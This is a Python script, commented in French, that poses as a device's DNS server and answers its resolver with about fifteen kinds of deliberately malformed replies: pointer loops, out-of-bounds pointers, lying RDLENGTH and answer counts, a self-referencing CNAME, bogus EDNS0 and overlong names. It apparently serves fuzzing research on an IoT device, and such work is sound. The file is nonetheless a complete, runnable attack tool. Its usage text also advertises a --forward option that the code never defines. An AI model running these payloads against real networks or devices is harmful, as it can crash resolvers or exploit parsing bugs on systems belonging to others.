#!/usr/bin/env python3
"""
fuzz_dns_reply.py — serveur DNS qui renvoie des RÉPONSES MALFORMÉES au device.

LE RENVERSEMENT : jusqu'ici on attaquait ce que le device nous envoie. Ici on
attaque **son client DNS** : quand nous sommes la passerelle, nous lui donnons
l'option DHCP 6 (serveur DNS) = notre IP, donc son résolveur nous interroge et
c'est NOUS qui produisons les réponses. Réponses que personne n'a jamais fuzzées.

CIBLES DE PARSING (toutes classiques, toutes dépendantes de l'implémentation) :
  décompression de noms (boucles de pointeurs), longueurs de RR incohérentes,
  compteurs menteurs, CNAME récursif, EDNS0, noms dépassant 255 octets après
  compression.

⚠️ CE QUE CE SCRIPT N'EST PAS : il ne devine pas si le client est glibc, netd ou
Go. Il envoie les motifs qui cassent les trois, et l'oracle tranche (voir plus bas).

ORACLE — à lire avant de tirer
  - une réponse NORMALE (--control) doit toujours passer : si elle ne passe plus,
    c'est que le résolveur est mort -> c'est le signal.
  - un cas isolé sans réponse = le client a rejeté ce paquet, PAS une faille.
  - redonder le même cas 3 fois : un rejet est déterministe, un crash aussi.
  - surveiller : perte de résolution (le device n'atteint plus Amazon), redémarrage
    du device, ou disparition de l'AP.

⚠️ NE PAS envoyer de réponse malformée à un nom dont le device dépend pour
fonctionner si vous voulez le garder vivant. Utiliser un nom de test
(--name fuzz.example) et laisser le reste passer en --forward.

Usage :
  python3 fuzz_dns_reply.py --listen 0.0.0.0 --port 5353 --case ptr_self --dump
  sudo python3 fuzz_dns_reply.py --listen 0.0.0.0 --port 53 --case all --name fuzz.test
  sudo python3 fuzz_dns_reply.py --listen 0.0.0.0 --port 53 --forward 1.1.1.1
"""
from __future__ import annotations

import argparse
import random
import socket
import struct
import sys
import time

T_A, T_CNAME, T_AAAA = 1, 5, 28
C_IN = 1


# ─────────────────────────── lecture de la requête ─────────────────────────
def parse_query(pkt: bytes) -> dict:
    if len(pkt) < 12:
        return {}
    qid, flags, qd, an, ns, ar = struct.unpack(">6H", pkt[:12])
    off = 12
    labels = []
    while off < len(pkt):
        ln = pkt[off]
        if ln == 0:
            off += 1
            break
        if ln & 0xC0:                       # compression dans la requête
            off += 2
            break
        labels.append(pkt[off + 1:off + 1 + ln])
        off += 1 + ln
    qtype = qclass = 0
    if off + 4 <= len(pkt):
        qtype, qclass = struct.unpack(">HH", pkt[off:off + 4])
        off += 4
    return {"qid": qid, "flags": flags, "qd": qd, "qname_len": off - 12,
            "qname_end": off, "qname_off": 12,
            "name": b".".join(labels).decode("latin1") or ".",
            "qtype": qtype, "qclass": qclass,
            "question": pkt[12:off]}


def header(qid: int, qd=1, an=0, ns=0, ar=0, flags=0x8180) -> bytes:
    """QR=1, RD=1, RA=1 par défaut."""
    return struct.pack(">6H", qid, flags, qd, an, ns, ar)


def rr(name_bytes: bytes, rtype: int, rclass: int, ttl: int,
       rdata: bytes, rdlen: int | None = None) -> bytes:
    n = len(rdata) if rdlen is None else rdlen
    return name_bytes + struct.pack(">HHIH", rtype, rclass, ttl, n) + rdata


# ─────────────────────────────── les cas ───────────────────────────────────
def c_normal(q: dict) -> bytes:
    """Témoin : réponse A valide."""
    ans = rr(b"\xc0\x0c", T_A, C_IN, 60, socket.inet_aton("10.0.0.1"))
    return header(q["qid"], an=1) + q["question"] + ans


def c_rdlen_over(q: dict) -> bytes:
    """RDLENGTH=512 mais seulement 4 octets suivent -> lecture hors paquet."""
    ans = rr(b"\xc0\x0c", T_A, C_IN, 60, b"\x0a\x00\x00\x01", rdlen=512)
    return header(q["qid"], an=1) + q["question"] + ans


def c_rdlen_under(q: dict) -> bytes:
    """RDLENGTH=1 pour un A (4 attendus) -> reste du RR interprété comme données."""
    ans = rr(b"\xc0\x0c", T_A, C_IN, 60, b"\x0a\x00\x00\x01", rdlen=1)
    return header(q["qid"], an=1) + q["question"] + ans


def c_ptr_self(q: dict) -> bytes:
    """Le nom de la réponse pointe sur lui-même -> boucle de décompression."""
    off = 12 + q["qname_len"]
    ans = struct.pack(">H", 0xC000 | off) + struct.pack(">HHIH", T_A, C_IN, 60, 4) + b"\x0a\x00\x00\x01"
    return header(q["qid"], an=1) + q["question"] + ans


def c_ptr_loop(q: dict) -> bytes:
    """Deux pointeurs qui se référencent mutuellement."""
    base = 12 + q["qname_len"]
    # pointeur à base -> base+2 ; pointeur à base+2 -> base
    p1 = struct.pack(">H", 0xC000 | (base + 2))
    p2 = struct.pack(">H", 0xC000 | base)
    ans = p1 + struct.pack(">HHIH", T_A, C_IN, 60, 4) + b"\x0a\x00\x00\x01"
    return header(q["qid"], an=1) + q["question"] + ans + p2


def c_ptr_oob(q: dict) -> bytes:
    """Pointeur vers 0x3FFF, très au-delà du paquet."""
    ans = struct.pack(">H", 0xFFFF) + struct.pack(">HHIH", T_A, C_IN, 60, 4) + b"\x0a\x00\x00\x01"
    return header(q["qid"], an=1) + q["question"] + ans


def c_label_overflow(q: dict) -> bytes:
    """Nom dépassant 255 octets APRÈS décompression (chaque label fait 63)."""
    lab = b"\x3f" + b"A" * 63
    name = lab * 5 + b"\x00"                     # 320 octets réels
    ans = name + struct.pack(">HHIH", T_A, C_IN, 60, 4) + b"\x0a\x00\x00\x01"
    return header(q["qid"], an=1) + q["question"] + ans


def c_ancount_ffff(q: dict) -> bytes:
    """ANCOUNT=0xFFFF annoncé, aucune réponse -> lecture au-delà de la fin."""
    return header(q["qid"], an=0xFFFF) + q["question"]


def c_ancount_mismatch(q: dict) -> bytes:
    """ANCOUNT=5, une seule réponse."""
    ans = rr(b"\xc0\x0c", T_A, C_IN, 60, b"\x0a\x00\x00\x01")
    return header(q["qid"], an=5) + q["question"] + ans


def c_truncated(q: dict) -> bytes:
    """TC=0 mais paquet coupé au milieu du RR."""
    ans = b"\xc0\x0c" + struct.pack(">HHIH", T_A, C_IN, 60, 4) + b"\x0a\x00"
    return header(q["qid"], an=1) + q["question"] + ans


def c_cname_self(q: dict) -> bytes:
    """CNAME qui pointe sur le nom interrogé -> résolution récursive infinie."""
    rd = q["question"][:-4]                       # le qname encodé, sans qtype/qclass
    ans = rr(b"\xc0\x0c", T_CNAME, C_IN, 60, rd)
    return header(q["qid"], an=1) + q["question"] + ans


def c_edns_absurd(q: dict) -> bytes:
    """OPT avec classe (payload) 0xFFFF et option malformée."""
    opt = b"\x00" + struct.pack(">HHIH", 41, 0xFFFF, 0, 8) + b"\x00\x0a\xff\xff" + b"\x00\x00"
    return header(q["qid"], ar=1) + q["question"] + opt


def c_qtype_mismatch(q: dict) -> bytes:
    """Renvoie un A alors que la question est AAAA (ou l'inverse)."""
    ans = rr(b"\xc0\x0c", T_A if q["qtype"] != T_A else T_AAAA, C_IN, 60, b"\x0a\x00\x00\x01")
    return header(q["qid"], an=1) + q["question"] + ans


def c_txt_over(q: dict) -> bytes:
    """TXT dont le premier octet de longueur dépasse la taille réelle."""
    rd = b"\xff" + b"short"
    ans = rr(b"\xc0\x0c", 16, C_IN, 60, rd)
    return header(q["qid"], an=1) + q["question"] + ans


def c_zero_labels(q: dict) -> bytes:
    """Nom composé de nombreux labels vides."""
    ans = b"\x00" * 40 + struct.pack(">HHIH", T_A, C_IN, 60, 4) + b"\x0a\x00\x00\x01"
    return header(q["qid"], an=1) + q["question"] + ans


CASES = {
    "normal": c_normal,
    "rdlen_over": c_rdlen_over,
    "rdlen_under": c_rdlen_under,
    "ptr_self": c_ptr_self,
    "ptr_loop": c_ptr_loop,
    "ptr_oob": c_ptr_oob,
    "label_overflow": c_label_overflow,
    "ancount_ffff": c_ancount_ffff,
    "ancount_mismatch": c_ancount_mismatch,
    "truncated": c_truncated,
    "cname_self": c_cname_self,
    "edns_absurd": c_edns_absurd,
    "qtype_mismatch": c_qtype_mismatch,
    "txt_over": c_txt_over,
    "zero_labels": c_zero_labels,
}

# les cas qui NE doivent pas être envoyés pour un nom critique
AGGRESSIVE = {"ptr_self", "ptr_loop", "label_overflow", "ancount_ffff", "cname_self"}


def main() -> None:
    try:
        sys.stdout.reconfigure(line_buffering=True)   # suivi en direct (nohup/tee)
    except Exception:
        pass
    ap = argparse.ArgumentParser(description="Réponses DNS malformées pour le client du device")
    ap.add_argument("--listen", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=5353)
    ap.add_argument("--case", default="normal",
                    help="nom de cas, 'all' (round-robin) ou 'normal'")
    ap.add_argument("--name", default="", help="ne malformer QUE ce qname (les autres -> normale)")
    ap.add_argument("--repeat", type=int, default=1, help="envoyer le cas N fois par requête")
    ap.add_argument("--dump", action="store_true", help="afficher le hex de chaque cas et sortir")
    args = ap.parse_args()

    if args.dump:
        q = parse_query(b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                        b"\x05fuzz\x04test\x00\x00\x01\x00\x01")
        print(f"question factice : {q['name']} type={q['qtype']}")
        names = list(CASES) if args.case in ("all", "") else [args.case]
        for n in names:
            pkt = CASES[n](q)
            print(f"\n=== {n} ({len(pkt)} o) ===")
            print("  " + pkt.hex(" "))
        return

    cases = list(CASES) if args.case == "all" else [args.case]
    for c in cases:
        if c not in CASES:
            sys.exit(f"cas inconnu: {c}\nconnus: {', '.join(CASES)}")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((args.listen, args.port))
    print(f"écoute DNS {args.listen}:{args.port} — cas {cases}"
          + (f" — seulement pour {args.name}" if args.name else " — POUR TOUS LES NOMS"))
    if args.case == "all":
        print("rappel : 'all' en round-robin inclut des cas agressifs "
              f"({', '.join(sorted(AGGRESSIVE))}).")
    idx = 0
    t0 = time.time()
    try:
        while True:
            data, addr = s.recvfrom(4096)
            q = parse_query(data)
            if not q:
                print(f"  {addr}: paquet illisible ({len(data)} o)")
                continue
            use = "normal" if (args.name and q["name"] != args.name) else cases[idx % len(cases)]
            idx += 1
            pkt = CASES[use](q)
            for _ in range(max(1, args.repeat)):
                s.sendto(pkt, addr)
            print(f"  t+{time.time()-t0:6.1f}s {addr[0]}:{addr[1]} "
                  f"{q['name'][:40]:40s} type={q['qtype']:<3} -> {use} ({len(pkt)} o)")
    except KeyboardInterrupt:
        print("\narrêt.")


if __name__ == "__main__":
    main()
